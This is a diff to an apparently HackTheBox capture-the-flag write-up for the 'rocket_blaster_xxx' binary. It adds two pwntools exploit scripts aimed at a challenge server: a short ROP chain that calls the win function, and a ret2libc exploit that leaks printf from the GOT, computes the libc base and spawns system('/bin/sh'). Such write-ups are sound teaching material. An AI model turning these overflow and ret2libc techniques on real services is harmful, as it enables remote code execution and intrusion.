@@ -93,7 +93,90 @@ sh.interactive()
 
 > REMOTE TEST
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/47027ad9-d23b-42e8-8da2-7cc3e26364f2)
 
+10. As you can see, we got the flag!.
+
+> ALTERNATE SCRIPT (much shorter using ropstar).
+
+```py
+from pwn import *
+
+exe = './rocket_blaster_xxx'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+# context.log_level = 'DEBUG'
+
+library = './glibc/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+# sh = process(exe)
+sh = remote('94.237.54.176',59344)
+
+rop = ROP(elf)
+rop.call(rop.ret.address)
+rop.fill_ammo(0xdeadbeef,0xdeadbabe,0xdead1337)
+
+p = cyclic(40) + rop.chain()
+
+sh.sendline(p)
+sh.interactive()
+```
+
+### GAINED RCE
+
+1. Remembering there is no canary, no PIE, and RDI is available. We can perform ret2libc here.
+2. Simply leak the printf@got address to calculate the libc base.
+3. Then execute another ROP to perform `system("/bin/sh")`.
+4. Here's the crafted script.
+
+> SCRIPT (RCE)
+
+```py
+from pwn import *
+
+exe = './rocket_blaster_xxx'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+# context.log_level = 'DEBUG'
+
+library = './glibc/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+# sh = process(exe)
+sh = remote('94.237.54.176',59344)
+rop = ROP(elf)
+
+p = flat([
+    cyclic(40),
+    rop.find_gadget(['pop rdi', 'ret'])[0],
+    elf.got['printf'],
+    elf.plt['puts'],
+    elf.sym['main']
+])
+
+sh.sendline(p)
+sh.recvuntil(b'testing..')
+sh.recvline()
+
+leak = unpack(sh.recv(6) + b'\x00' * 2)
+success(f'LIBC LEAK --> {hex(leak)}')
+libc.address = leak - libc.sym['printf']
+info(f'LIBC BASE --> {hex(libc.address)}')
+
+p = flat([
+    cyclic(40),
+    rop.find_gadget(['ret']).address,
+    rop.find_gadget(['pop rdi', 'ret']).address,
+    next(libc.search(b'/bin/sh\x00')),
+    libc.sym['system']
+])
+
+sh.sendline(p)
+sh.interactive()
+```
+
+> RESULT
 
 
 
